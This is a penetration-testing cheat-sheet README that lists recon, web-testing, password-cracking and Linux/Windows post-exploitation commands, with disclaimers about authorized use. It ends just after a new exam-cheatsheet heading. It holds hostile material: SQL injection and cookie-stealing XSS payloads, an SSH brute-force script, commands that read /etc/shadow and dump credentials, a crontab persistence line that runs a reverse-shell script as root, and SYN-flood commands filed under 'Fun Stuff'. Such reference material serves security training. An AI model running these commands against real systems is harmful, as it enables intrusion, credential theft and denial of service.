# Hacking Stuff

This repository contains a collection of commands for reconnaissance, networking utilities, Linux hacking techniques, password cracking, and playful activities. Use these responsibly and only on systems you have explicit permission to test. This `README.md` serves as a quick reference for security enthusiasts and learners.

---

## Prerequisites

Ensure the following tools are installed before running the commands:

- **Snort**: Intrusion detection and prevention system (`snort`)
- **Wireshark**: Network protocol analyzer (GUI and CLI via `tshark`)
- **RustScan**: Fast port scanner (`rustscan`)
- **Nikto**: Web server scanner (`nikto`)
- **Amass**: Subdomain enumeration tool (`amass`)
- **Gobuster**: Directory and subdomain brute-forcer (`gobuster`)
- **WPScan**: WordPress vulnerability scanner (`wpscan`)
- **hping3**: Packet crafting tool (`hping3`)
- **tshark**: Network protocol analyzer (part of Wireshark, `tshark`)
- **nmap**: Network exploration tool (`nmap`)
- **theHarvester**: OSINT tool for emails and subdomains (`theHarvester`)
- **curl**, **whois**, **whatweb**, **netcat**: Common utilities
- **dig**, **nslookup**, **host**, **ifconfig**, **ip**, **netstat**, **ss**, **mtr**, **iftop**, **ethtool**, **scp**, **sftp**, **rsync**, **bmon**, **vnstat**, **nmcli**: Additional networking tools
- **ffuf**, **dnsenum**, **subfinder**, **sqlmap**: Additional recon tools
- **assetfinder**, **dnsx**, **anubis**, **sherlock**, **spiderfoot**, **metagoofil**, **linkedin2username**, **h8mail**, **dnstwist**, **altdns**, **findomain**, **asnlookup**, **masscan**, **naabu**, **massdns**, **fierce**, **dnsvalidator**, **puredns**, **shuffledns**, **hosthunter**, **dirsearch**, **gospider**, **hakrawler**, **httprobe**, **httpx**, **paramspider**, **arjun**, **linkfinder**, **403bypasser**, **nuclei**, **wapiti**, **dalfox**, **xsstrike**, **jaeles**, **burpsuite**, **owasp zap**, **sslscan**, **waybackurls**, **gau**, **katana**, **gowitness**: Additional recon tools
- **John the Ripper**: Password cracking tool (`john`)
- **Hashcat**: Advanced password recovery tool (`hashcat`)
- **LinPEAS**: Linux privilege escalation scanner (`linpeas.sh`)

Install tools using your package manager (e.g., `apt`, `brew`) or follow official documentation. For **Snort**, install via `apt install snort` or download from [snort.org](https://www.snort.org/). For **Wireshark** and **TShark**, install via `apt install wireshark tshark` or download from [wireshark.org](https://www.wireshark.org/). Wordlists like `dirbuster`, `seclists`, and `rockyou.txt` are required for tools like `gobuster`, `john`, and `hashcat`.

---

## Ethical Use

These commands are for educational purposes and authorized security testing only. Unauthorized use on systems you don't own or have explicit permission to test is illegal and unethical. Always obtain written consent before performing any scans or tests.

---

## Recon Stuff

Follow this workflow for effective reconnaissance. Start with **Passive Recon** to gather information without directly interacting with the target, then move to **Active Recon** for scanning and enumeration, followed by **Web Recon** for web-specific discovery and vulnerability scanning, and finally **Password Cracking** for recovering passwords from hashes.

### Passive Recon (Gather Information Safely)

Use these tools first to collect OSINT, domains, subdomains, and other publicly available data without touching the target.

```bash
theHarvester -d domain.com -b all  # Gather emails, subdomains, and hosts via OSINT
sherlock username  # Hunt down social media accounts by username
spiderfoot -t domain.com  # Automate OSINT across multiple sources
metagoofil -d domain.com -t pdf,doc  # Search Google for public files on the target site
linkedin2username -c "Company Name"  # Generate username lists from LinkedIn companies
h8mail -t target@email.com  # OSINT for email breaches and password leaks
whois domain.com  # Display website registration and owner information
assetfinder domain.com  # Find domains and subdomains related to the target
subfinder -d domain.com  # Fast passive subdomain enumeration
amass enum -d domain.com  # Network mapping and external asset discovery
dnsx -d domain.com  # Run multi-purpose DNS queries for subdomains
anubis -t domain.com  # Subdomain enumeration and info gathering
dnstwist -d domain.com  # Uncover potentially malicious domains targeting your org
altdns -i subdomains.txt -o permuted.txt  # Subdomain discovery through alterations
findomain -t domain.com  # Directory fuzzing, port scanning, and more
asnlookup -o "Organization Name"  # Search for organization ASNs and IP space
```

### Active Recon (Scan and Enumerate)

Once you have a list of domains, subdomains, and IPs, use these tools to actively scan the target for services, ports, and host information. Be cautious as these may alert the target.

```bash
dnsenum domain.com  # Advanced DNS enumeration for subdomains and records
massdns -r resolvers.txt -t A subdomains.txt  # High-performance DNS resolution
fierce --domain domain.com  # Locate non-contiguous IP space and hostnames
dnsvalidator -tL resolvers.txt  # Validate DNS servers for accuracy
puredns bruteforce subdomains.txt domain.com  # Subdomain bruteforcing with wildcard filtering
shuffledns -d domain.com -w subdomains.txt -r resolvers.txt  # Mass DNS bruteforcing with wildcard handling
hosthunter 192.168.1.0/24  # Discover hostnames for a range of IP addresses
host domain.com  # Display domain name for given IP or vice-versa
dig domain.com  # Query DNS info such as A, CNAME, MX records
nslookup domain.com  # Query DNS servers interactively
sudo nmap -sS -sV -T4 domain.com  # Explore hosts, IPs, ports, and services
rustscan -a domain.com  -- -sV -O # Fast port scanning
masscan -p1-65535 domain.com  # Mass IP port scanning
naabu -host domain.com  # Enumerate valid ports for hosts
nc -zv domain.com 80  # Scan specific ports using netcat
tshark -i eth0 -f "tcp port 80" -w capture.pcap  # Capture HTTP traffic on port 80 to a file
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.method -e http.request.uri  # Extract HTTP methods and URIs from captured packets
tshark -i eth0 -f "host domain.com" -Y "dns"  # Capture and display DNS queries for a specific host
tshark -r capture.pcap -Y "http contains password"  # Search for "password" in HTTP traffic
tshark -i eth0 -c 100 -T fields -e ip.src -e ip.dst -e tcp.port  # Capture and display source/destination IPs and TCP ports for 100 packets
```

**Note**: `tshark` is the command-line interface of Wireshark, ideal for scripting and automation. Use `-w` to save captures and `-r` to read them. Ensure you have permission to capture traffic, as this may be noisy and detectable.


### Web Recon (Target Web Applications)

Finally, focus on web applications to discover directories, parameters, endpoints, and vulnerabilities. These tools are specific to web targets.

```bash
whatweb domain.com  # Identify web technologies
nikto -h domain.com  # Scan for web server vulnerabilities
urlfinder -d domain.com -o domain.txt  # Find URLs on the target
gobuster dir -u domain.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  # Brute-force directories
gobuster dns -d domain.com -w /usr/share/seclists/sublist3r  # Brute-force subdomains
dirsearch -u domain.com  # Web path discovery
ffuf -u http://domain.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  # Fast web fuzzing
gospider -s http://domain.com  # Fast web spidering for URLs and JS files
hakrawler -url http://domain.com  # Crawl for URLs and JS file locations
httprobe < subdomains.txt  # Probe for working HTTP/HTTPS servers
httpx -l subdomains.txt  # Run multiple HTTP probes on a list of domains
paramspider -d domain.com  # Mine parameters from web archives
arjun -u http://domain.com  # HTTP parameter discovery
linkfinder -i http://domain.com  # Discover endpoints in JavaScript files
403bypasser -u http://domain.com  # Bypass access control restrictions
waybackurls domain.com  # Fetch URLs from the Wayback Machine
gau domain.com  # Fetch known URLs from AlienVault
katana -u http://domain.com  # Next-gen crawling and spidering
gowitness -f subdomains.txt  # Take screenshots of web pages
sslscan domain.com  # SSL enumeration and vulnerability scanning
wpscan --url domain.com --enumerate u  # Scan WordPress for users
wpscan --url domain.com --enumerate vp,vt --plugins-detection  # Scan WordPress for plugins/themes
sqlmap -u "http://domain.com/index.php?id=1" --dbs  # Test for SQL injection
nuclei -u http://domain.com  # Vulnerability scanning with YAML templates
wapiti -u http://domain.com  # Web vulnerability scanner
dalfox url http://domain.com  # Scan for XSS flaws
xsstrike -u http://domain.com  # Advanced XSS detection
jaeles scan -u http://domain.com  # Custom web application scanning
burpsuite  # Manual security assessment of web apps (GUI tool)
owasp zap  # Widely used web vulnerability scanner (GUI tool)
```

## HTTP Status Codes and Methods for Bug Bounty Hunting

HTTP status codes and methods are critical for identifying vulnerabilities during web application testing. Below are the most important status codes and HTTP methods for bug bounty hunting, along with how to leverage them using **Burp Suite**, a powerful tool for manual security assessments.

### Key HTTP Status Codes

- **200 OK**
  - **Description**: Request successful, resource returned.
  - **Relevance**: Indicates valid endpoints; check for sensitive data exposure (e.g., API keys, user data).
  - **Burp Suite**: Use **Repeater** to modify parameters and test for **IDOR**. Fuzz endpoints with **Intruder** to enumerate resources. Review **Site Map** for interesting `200` responses.
  - **Example**: `GET /api/users` returning user data.

- **301/302 Moved Permanently/Temporarily**
  - **Description**: Resource redirected to a new URL.
  - **Relevance**: Test for **Open Redirects** (e.g., `?redirect=evil.com`) or **CRLF Injection** in `Location` headers.
  - **Burp Suite**: Use **Repeater** to manipulate redirect parameters. Fuzz with **Intruder** to find unvalidated redirects.
  - **Example**: `GET /logout?redirect=evil.com`.

- **400 Bad Request**
  - **Description**: Malformed request due to invalid syntax or parameters.
  - **Relevance**: Test for bypassable validation or error message leaks.
  - **Burp Suite**: Craft malformed requests in **Repeater**. Fuzz parameters with **Intruder** to trigger verbose errors.
  - **Example**: `POST /api/submit` with invalid JSON.

- **401 Unauthorized**
  - **Description**: Authentication required but not provided.
  - **Relevance**: Test for **Authentication Bypass** by manipulating headers (e.g., `Authorization`).
  - **Burp Suite**: Modify headers in **Repeater**. Brute-force credentials with **Intruder**.
  - **Example**: `GET /admin` without a token.

- **403 Forbidden**
  - **Description**: Authenticated user lacks permission.
  - **Relevance**: Prime for **Access Control Vulnerabilities** (e.g., **IDOR**, privilege escalation).
  - **Burp Suite**: Test different methods in **Repeater**. Use `403bypasser` to bypass restrictions. Compare responses with **Auth Analyzer**.
  - **Example**: `GET /admin` as a low-privileged user.

- **404 Not Found**
  - **Description**: Resource does not exist.
  - **Relevance**: Enumerate hidden resources with wordlists. Check for verbose error pages.
  - **Burp Suite**: Fuzz with **Intruder** using `dirbuster` wordlists. Analyze custom `404` pages in **Crawler**.
  - **Example**: `GET /backup.zip`.

- **429 Too Many Requests**
  - **Description**: Rate limit exceeded.
  - **Relevance**: Test for **Rate Limit Bypasses** by varying headers (e.g., `X-Forwarded-For`).
  - **Burp Suite**: Flood requests with **Turbo Intruder**. Test headers in **Repeater**.
  - **Example**: `POST /api/login` after multiple attempts.

- **500 Internal Server Error**
  - **Description**: Server encountered an unexpected error.
  - **Relevance**: Indicates poor error handling; test for stack traces or injection vulnerabilities.
  - **Burp Suite**: Fuzz payloads in **Intruder**. Analyze responses in **Repeater** for leaks.
  - **Example**: `POST /api/submit` with malformed data.

### Key HTTP Methods

- **GET**: Retrieve resources. Test for **Information Disclosure** or **Open Redirects**.
  - **Burp Suite**: Fuzz paths with **Intruder**. Modify queries in **Repeater**.
  - **Example**: `GET /user?id=1`.

- **POST**: Submit data. Test for **SQL Injection**, **XSS**, or **CSRF**.
  - **Burp Suite**: Manipulate payloads in **Repeater**. Scan with **Scanner**.
  - **Example**: `POST /login` with malicious input.

- **PUT**: Update resources. Test for **Access Control Issues** or **Mass Assignment**.
  - **Burp Suite**: Test unauthorized updates in **Repeater**. Fuzz with **Intruder**.
  - **Example**: `PUT /user/1` with `role=admin`.

- **DELETE**: Remove resources. Test for **Access Control** or **CSRF**.
  - **Burp Suite**: Test unauthorized deletions in **Repeater**. Fuzz IDs with **Intruder**.
  - **Example**: `DELETE /user/1`.

- **HEAD**: Retrieve metadata. Enumerate resources efficiently.
  - **Burp Suite**: Compare with `GET` in **Repeater**. Fuzz with **Intruder**.
  - **Example**: `HEAD /config`.

- **OPTIONS**: List supported methods. Check for **CORS Misconfigurations**.
  - **Burp Suite**: Enumerate methods in **Repeater**. Use **CORS Scanner** extension.
  - **Example**: `OPTIONS /api`.

- **PATCH**: Partially update resources. Test for **Access Control** or **Logic Flaws**.
  - **Burp Suite**: Test field modifications in **Repeater**. Fuzz with **Intruder**.
  - **Example**: `PATCH /user/1` with `email=new@domain.com`.

### Burp Suite Workflow

- **Recon**: Use `gobuster`, `ffuf`, or `waybackurls` to find endpoints. Filter by status codes with `httpx`.
- **Proxy**: Intercept requests with **Proxy**. Organize in **Site Map**.
- **Fuzzing**: Use **Intruder** to test parameters and methods. Try `403bypasser` for access control bypasses.
- **Scanning**: Run **Scanner** on `POST`, `PUT`, and `PATCH` endpoints. Check `OPTIONS` for CORS issues.
- **Access Control**: Compare responses across roles with **Auth Analyzer**.
- **Reporting**: Document findings in **Issue Activity** for PoC reports.

**Note**: Only test authorized systems. Excessive requests may cause DoS. Report vulnerabilities responsibly.

## Common Web Vulnerabilities

Understanding common web vulnerabilities is crucial for bug bounty hunting and penetration testing. This section covers key vulnerabilities from the [OWASP Top 10 (2021)](https://owasp.org/Top10/) and other prevalent issues, including **SQL Injection**, **Cross-Site Scripting (XSS)**, **Insecure Direct Object Reference (IDOR)**, and **Server-Side Request Forgery (SSRF)**. Each vulnerability includes a description, testing techniques, and how to use tools from this repository (e.g., `sqlmap`, `dalfox`, `burpsuite`) to identify them. Always test responsibly on authorized systems.

### 1. SQL Injection (OWASP A03:2021 - Injection)

- **Description**: Occurs when untrusted input is directly included in SQL queries, allowing attackers to manipulate database queries to extract data, bypass authentication, or execute commands.
- **Impact**: Data leakage, unauthorized access, database compromise.
- **Testing Techniques**:
  - Inject payloads like `' OR '1'='1` in URL parameters or form fields (e.g., `http://domain.com/index.php?id=1' OR '1'='1`).
  - Look for error messages (e.g., SQL syntax errors) or unexpected behavior (e.g., bypassing login).
  - Use automated tools to test for injection points.
- **Tools and Commands**:
  ```bash
  sqlmap -u "http://domain.com/index.php?id=1" --dbs  # Enumerate databases
  sqlmap -u "http://domain.com/index.php?id=1" --dump  # Dump table data
  sqlmap -u "http://domain.com/login" --data="username=admin&password=test"  # Test POST parameters
  ```
- **Burp Suite**: Intercept GET or POST requests in **Proxy**, send to **Repeater**, and inject payloads (e.g., `' OR '1'='1`). Use **Intruder** to fuzz parameters with SQL payloads. Run **Scanner** to detect SQL injection.
- **Example**: Injecting `id=1 UNION SELECT username,password FROM users` to extract credentials.
- **Mitigation**: Use prepared statements, input validation, and parameterized queries.

### 2. Cross-Site Scripting (XSS) (OWASP A07:2021 - Cross-Site Scripting)

- **Description**: Allows attackers to inject malicious scripts into web pages viewed by other users, executed in the victim's browser.
- **Types**:
  - **Reflected XSS**: Script in URL or form input reflected in response (e.g., `http://domain.com/search?q=<script>alert(1)</script>`).
  - **Stored XSS**: Script stored on the server (e.g., in comments) and executed for all users.
  - **DOM-Based XSS**: Script manipulates the DOM client-side without server interaction.
- **Impact**: Session hijacking, phishing, data theft.
- **Testing Techniques**:
  - Inject payloads like `<script>alert(1)</script>` or `"><img src=x onerror=alert(1)>` in input fields, URLs, or headers.
  - Check for script execution in the browser or DOM.
  - Test for bypasses if input is sanitized (e.g., use `onerror`, `onload` events).
- **Tools and Commands**:
  ```bash
  dalfox url http://domain.com  # Scan for reflected and stored XSS
  xsstrike -u http://domain.com  # Advanced XSS detection with payload fuzzing
  ```
- **Burp Suite**: Inject XSS payloads in **Repeater** for GET/POST requests. Use **Intruder** to fuzz input fields with XSS wordlists (e.g., from seclists). Run **Scanner** to detect XSS vulnerabilities.
- **Example**: Submitting `<img src=x onerror=alert(document.cookie)>` in a comment field to steal cookies.
- **Mitigation**: Encode output, use Content Security Policy (CSP), sanitize inputs.

### 3. Insecure Direct Object Reference (IDOR) (OWASP A01:2021 - Broken Access Control)

- **Description**: Occurs when an application exposes direct references to internal objects (e.g., user IDs, files) without proper authorization, allowing attackers to access unauthorized resources.
- **Impact**: Unauthorized data access, privilege escalation.
- **Testing Techniques**:
  - Change resource IDs in URLs or parameters (e.g., `GET /user/1` to `/user/2`).
  - Test APIs for access to other users' data (e.g., `POST /api/profile` with another user's ID).
  - Compare responses across user roles (e.g., admin vs. regular user).
- **Tools and Commands**:
  ```bash
  ffuf -u http://domain.com/user/FUZZ -w /usr/share/wordlists/seclists/Fuzzing/numbers.txt  # Fuzz user IDs
  ```
- **Burp Suite**: Use **Repeater** to modify IDs in GET/POST requests. Fuzz IDs with **Intruder**. Compare responses with **Auth Analyzer** across sessions. Use `403bypasser` to test restricted endpoints.
- **Example**: Changing `GET /api/user/100` to `/api/user/101` to access another user's profile.
- **Mitigation**: Implement proper access controls, use indirect references, validate user permissions.

### 4. Server-Side Request Forgery (SSRF) (OWASP A10:2021 - Server-Side Request Forgery)

- **Description**: Allows attackers to make unauthorized requests from the server to internal or external resources, often bypassing firewalls or accessing sensitive systems.
- **Impact**: Access to internal services, data leakage, remote code execution.
- **Testing Techniques**:
  - Inject URLs in input fields or parameters (e.g., `?url=http://localhost/admin` or `?url=http://169.254.169.254/latest/meta-data/` for cloud metadata).
  - Test for blind SSRF by monitoring DNS or HTTP requests to attacker-controlled servers.
  - Try protocol schemes like `file://`, `gopher://`, or `dict://` to access local resources.
- **Tools and Commands**:
  ```bash
  curl http://domain.com/fetch?url=http://localhost  # Test for SSRF manually
  ```
- **Burp Suite**: Inject SSRF payloads in **Repeater** (e.g., `url=http://internal.service`). Use **Intruder** to fuzz URLs with internal IPs or cloud metadata endpoints. Monitor responses with **Collaborator Client** for blind SSRF.
- **Example**: Changing `?url=http://domain.com` to `?url=http://169.254.169.254/latest/meta-data/` to access AWS metadata.
- **Mitigation**: Validate and restrict URLs, use allowlists, disable unused protocols.

### 5. Other OWASP Top 10 Vulnerabilities (2021)

- **A02: Cryptographic Failures**:
  - Test for weak SSL/TLS configurations or exposed sensitive data.
  - **Tool**: `sslscan domain.com` to enumerate SSL vulnerabilities.
  - **Burp Suite**: Check for weak ciphers in **Site Map** or **Scanner**.
- **A04: Insecure Design**:
  - Look for logic flaws (e.g., password reset without validation).
  - **Burp Suite**: Test workflows in **Repeater** for missing checks.
- **A05: Security Misconfiguration**:
  - Identify exposed admin panels or default credentials.
  - **Tools**: `nikto -h domain.com`, `gobuster dir -u domain.com`.
  - **Burp Suite**: Enumerate endpoints with **Crawler**.
- **A06: Vulnerable and Outdated Components**:
  - Check for outdated software (e.g., WordPress plugins).
  - **Tool**: `wpscan --url domain.com --enumerate vp,vt`.

---

### Python

Python is a powerful language for hacking, offering libraries for network scanning, web scraping, packet crafting, and automation. Below are commonly used Python commands and scripts for hacking tasks. Ensure you have the required libraries installed (e.g., `pip install requests scapy paramiko beautifulsoup4 pwntools`).

```bash
python3 -m http.server  # Start a simple HTTP server for file sharing or testing
python3 -m venv /work/venv  # Create a virtual environment for isolated Python projects
source /work/venv/bin/activate  # Activate the virtual environment
deactivate  # Exit the virtual environment
pip install requests scapy paramiko beautifulsoup4 pwntools  # Install common hacking libraries
```

#### Example Python Scripts for Hacking

1. **Port Scanner (Using `socket`)**  
   A simple script to scan open ports on a target host.

   ```python
   import socket
   import sys

   target = input("Enter target IP: ")
   ports = range(1, 1000)

   for port in ports:
       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       sock.settimeout(1)
       result = sock.connect_ex((target, port))
       if result == 0:
           print(f"Port {port} is open")
       sock.close()
   ```

2. **Web Scraper (Using `requests` and `beautifulsoup4`)**  
   Extract links from a website for reconnaissance.

   ```python
   import requests
   from bs4 import BeautifulSoup

   url = input("Enter target URL (e.g., http://example.com): ")
   response = requests.get(url)
   soup = BeautifulSoup(response.text, 'html.parser')

   for link in soup.find_all('a'):
       href = link.get('href')
       if href:
           print(href)
   ```

3. **SSH Brute Force (Using `paramiko`)**  
   Attempt to brute-force SSH credentials (use with permission only).

   ```python
   import paramiko
   import sys

   target = input("Enter target IP: ")
   username = input("Enter username: ")
   password_file = input("Enter password file path: ")

   with open(password_file, 'r') as file:
       for password in file:
           password = password.strip()
           try:
               ssh = paramiko.SSHClient()
               ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
               ssh.connect(target, username=username, password=password)
               print(f"Success! Password: {password}")
               ssh.close()
               break
           except:
               print(f"Failed: {password}")
   ```

4. **Packet Sniffer (Using `scapy`)**  
   Capture and analyze network packets.

   ```python
   from scapy.all import *

   def packet_callback(packet):
       if packet.haslayer(IP):
           ip_src = packet[IP].src
           ip_dst = packet[IP].dst
           print(f"Packet: {ip_src} -> {ip_dst}")

   sniff(iface="eth0", prn=packet_callback, count=10)
   ```

5. **Exploit Development (Using `pwntools`)**  
   Template for interacting with a binary or remote service.

   ```python
   from pwn import *

   binary = './vulnerable'
   p = process(binary)  # Or remote('domain.com', 1337)
   payload = b'A' * 64 + p64(0xdeadbeef)
   p.sendline(payload)
   p.interactive()
   ```

These scripts require the respective libraries and should be used responsibly on authorized systems only.

---

### Password Cracking (Recover Passwords from Hashes)

Use these tools to crack password hashes obtained during reconnaissance or penetration testing. Ensure you have legal authorization to attempt password recovery.

#### John the Ripper

John the Ripper is a versatile password cracker supporting various hash types, ideal for CPU-based cracking and diverse formats. Install it via `apt install john` on Linux or download from [openwall.com](https://www.openwall.com/john/).

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  # Crack hashes using rockyou wordlist
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  # Crack MD5 hashes
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  # Crack SHA-256 hashes
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt ticket.txt  # Crack Kerberos TGT hashes
john --show hash.txt  # Display cracked passwords
```

#### Hashcat

Hashcat is a GPU-accelerated password recovery tool, excelling at cracking complex hashes quickly. Install it via `apt install hashcat` or download from [hashcat.net](https://hashcat.net/hashcat/). Requires a compatible GPU.

```bash
hashcat -m 0 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt  # Crack MD5 hashes (dictionary attack)
hashcat -m 1000 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt  # Crack NTLM hashes
hashcat -m 3200 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt  # Crack bcrypt hashes
hashcat -m 500 -a 3 -o cracked.txt hash.txt ?a?a?a?a  # Brute-force MD5 with 4-character passwords
hashcat --show -o cracked.txt  # Display cracked passwords
```

---

## Networking Utilities

Commands for managing, diagnosing, and monitoring network activity on Linux systems.

```bash
ifconfig  # Display network interface details, assign IPs, enable/disable interfaces
ip addr  # Display and manipulate routing, devices, interfaces (more powerful than ifconfig)
netstat -tuln  # Show network statistics: open sockets, routing tables, connection info
ss -tuln  # Display socket statistics, a faster replacement for netstat
traceroute domain.com  # Trace the full path of packets from your system to another host
tracepath domain.com  # Similar to traceroute but doesn't require root privileges
ping domain.com  # Check connectivity between hosts using ICMP packets
route -n  # Display and manipulate the IP routing table
iwconfig  # Display and configure wireless network interfaces, like SSID and encryption
arp -n  # Display Address Resolution Protocol (ARP) table from the kernel
wget http://domain.com/file  # Download files via HTTP/HTTPS/FTP, supports multiple files
mtr domain.com  # Combine ping and traceroute for network diagnostics and live monitoring
iftop  # Monitor bandwidth usage on an interface in real-time
ethtool eth0  # Query and modify network interface controller parameters
scp file.txt user@domain.com:/path  # Securely transfer files between hosts using SSH
sftp user@domain.com  # Secure file transfer protocol for file access and transfer
rsync -avz source/ user@domain.com:/path  # Sync files between hosts over SSH, efficient for large data
bmon  # Monitor real-time bandwidth and debug network issues
vnstat  # Monitor network traffic consumption on specified interfaces
nmcli device  # Manage network connections, control NetworkManager
```

### Intrusion Detection with Snort

**Snort** is an open-source intrusion detection and prevention system (IDS/IPS) for real-time traffic analysis and packet logging. It's ideal for detecting malicious activity, such as exploits or reconnaissance scans, using predefined or custom rules. Install via `apt install snort` or download from [snort.org](https://www.snort.org/). Requires rule configuration (e.g., community rules or subscription-based rules).

```bash
sudo snort -i eth0 -c /etc/snort/snort.conf -A console  # Run Snort in IDS mode, log alerts to console
sudo snort -i eth0 -c /etc/snort/snort.conf -l /var/log/snort -A full  # Log all packets and alerts to /var/log/snort
sudo snort -r /var/log/snort/snort.log -c /etc/snort/snort.conf  # Analyze a saved packet capture for rule violations
sudo snort -i eth0 -k none -Q  # Run Snort in inline IPS mode to drop malicious packets (requires setup)
snort -T -c /etc/snort/snort.conf  # Test Snort configuration file for errors
sudo snort -i eth0 -c /etc/snort/snort.conf -A cmg -N  # Monitor traffic with minimal logging for performance
```

**Note**: Snort requires a valid configuration file (`snort.conf`) and rules (e.g., from [snort.org](https://www.snort.org/downloads#rules)). Use `-A` to control alert modes (e.g., `console`, `full`, `cmg`). Ensure you have permission to monitor traffic, and tune rules to reduce false positives.

### Packet Analysis with Wireshark

**Wireshark** is a powerful GUI-based network protocol analyzer for dissecting packets and troubleshooting network issues. It's widely used for deep packet inspection during security assessments. Install via `apt install wireshark` or download from [wireshark.org](https://www.wireshark.org/). For CLI-based analysis, see `tshark` under **Active Recon**.

- **Launch Wireshark**: Start the GUI and select an interface (e.g., `eth0`) to capture traffic.
  ```bash
  wireshark &
  ```

- **Capture Traffic**: Use a capture filter to reduce noise (e.g., `host domain.com` or `tcp port 80`).
  ```bash
  wireshark -i eth0 -f "host domain.com" -k  # Start capturing traffic from domain.com immediately
  ```

- **Analyze Saved Capture**: Open a `.pcap` file for detailed inspection.
  ```bash
  wireshark -r capture.pcap  # Load a saved capture file
  ```

- **Apply Display Filters**: Use filters in the GUI to focus on specific traffic (e.g., `http.request` or `dns.qry.name contains domain.com`).
  - Example: In Wireshark's filter bar, enter `http contains password` to find HTTP packets with "password".
  - Example: `ip.src == 192.168.1.100 && tcp.port == 80` to filter traffic from a source IP on port 80.

- **Export Objects**: Extract files (e.g., images, documents) from HTTP traffic.
  - In Wireshark: `File > Export Objects > HTTP`, then save extracted files.

- **Follow Streams**: Reconstruct TCP/UDP streams (e.g., HTTP conversations).
  - Right-click a packet, select `Follow > TCP Stream` to view the full conversation.

**Note**: Wireshark requires root privileges or proper permissions to capture traffic (e.g., add user to `wireshark` group). Use capture filters (`-f`) to limit data and display filters for analysis. Save captures to `.pcap` files for later review. For scripting or automation, use `tshark` (see **Active Recon**).

---

## Linux Commands for Hackers

Essential Linux commands for hacking tasks, including file security, privilege escalation, and system enumeration.

```bash
shred -u file.txt  # Securely delete files by overwriting them
find / -name "config*" 2>/dev/null  # Search for sensitive files (e.g., configs)
id  # Display user and group information
sudo -l  # List sudo privileges for the current user
cat /etc/passwd  # View user accounts (check for misconfigurations)
cat /etc/shadow  # View hashed passwords (if readable, requires root)
find / -perm -4000 2>/dev/null  # Find SUID binaries for potential privilege escalation
uname -a  # Display kernel and system info for exploit research
ps aux  # List running processes to identify potential targets
crontab -l  # List cron jobs to check for persistence opportunities
```

---

## LinPEAS (Linux Privilege Escalation Awesome Script)

LinPEAS is a powerful script for enumerating potential privilege escalation vectors on Linux systems. It checks for misconfigurations, vulnerable services, weak permissions, and other exploitable conditions. Download it from [GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).

### Usage

1. **Download LinPEAS**  
   Transfer the script to the target system (e.g., via `scp`, `wget`, or `curl`).

   ```bash
   wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
   ```

2. **Make Executable**  
   Grant execute permissions to the script.

   ```bash
   chmod +x linpeas.sh
   ```

3. **Run LinPEAS**  
   Execute the script to perform a comprehensive enumeration. Redirect output to a file for easier analysis.

   ```bash
   ./linpeas.sh > linpeas_output.txt
   ```

4. **Key Checks Performed by LinPEAS**  
   - System information (kernel version, OS, hostname)
   - User and group enumeration (SUID/GUID binaries, sudo permissions)
   - File and directory permissions (writable files, sensitive configs)
   - Network information (open ports, listening services)
   - Cron jobs and scheduled tasks
   - Installed software and potential vulnerabilities
   - Cloud service misconfigurations (AWS, GCP, Azure)

5. **Analyze Output**  
   Review the output for highlighted issues (e.g., red/yellow text for critical findings). Focus on:
   - Writable configuration files
   - SUID binaries with known exploits
   - Weak sudo permissions
   - Exposed credentials in files or environment variables

**Note**: LinPEAS is noisy and may be detected by security tools. Use it only on systems you are authorized to test. Always save the output for detailed analysis.

---

## Fun Stuff

Miscellaneous commands for playful or experimental purposes.

```bash
steghide
ping -s 1300 -f domain.com
hping3 -S -V --flood domain.com
hping3 --traceroute -V -1 domain.com
cat /dev/urandom
alias ls="cat /dev/urandom"
curl wttr.in
```

---

## Resources

Explore these resources for further learning, tool documentation, and password cracking utilities:

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Kali Linux Tools Listing](https://www.kali.org/tools/)
- [SecLists GitHub](https://github.com/danielmiessler/SecLists) for wordlists
- [CrackStation](https://crackstation.net/) for online hash lookup and password cracking dictionaries
- [CyberChef](https://gchq.github.io/CyberChef/) for encryption, encoding, compression, and data analysis
- [Cryptii](https://cryptii.com/) for modular text transformation and encoding/decoding
- [LinPEAS GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) for privilege escalation

---

**Note**: Replace `domain.com` with the target domain and ensure you have authorization. Some commands require root privileges or specific tools installed. Save outputs to files (e.g., `nmap -oN output.txt`) for easier analysis.

# Banner Grabbing
nc -nv domain.com 80
telnet domain.com 80

# DNS Zone Transfer
dig axfr @ns1.domain.com domain.com

# Subnetting Example
# IP: 192.168.1.0/24 => Range: 192.168.1.1 - 192.168.1.254

# File Upload Bypass
# Try uploading .php, .php.jpg, .phtml, or use Burp to change Content-Type

# Disable JavaScript in browser dev tools to bypass client-side validation

# SMB Enumeration
enum4linux -a domain.com
smbclient -L //domain.com/

# FTP Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://domain.com

# SNMP Enumeration
snmpwalk -v2c -c public domain.com

# Packet Capture
tcpdump -i eth0 -w capture.pcap

# BloodHound Collection
neo4j console & bloodhound &  # Start services
SharpHound.exe -c all         # Collect data on Windows

# Kerberoasting
GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass

# Windows Enumeration
net user /domain
net group \"Domain Admins\" /domain

# Windows Credential Dumping
mimikatz
secretsdump.py -just-dc-user domain/user:pass@dc-ip

# Linux Persistence
echo \"* * * * * root /tmp/rev.sh\" >> /etc/crontab

# Post-Exploitation Recon
whoami
hostname
ipconfig /all

---

# PT1 Exam Cheatsheet & Checklist

This section is a quick-access guide for the TryHackMe Junior Penetration Tester (PT1) exam. Use it to review key tools, commands, and strategies for each exam domain. Good luck!

## Reconnaissance & Enumeration

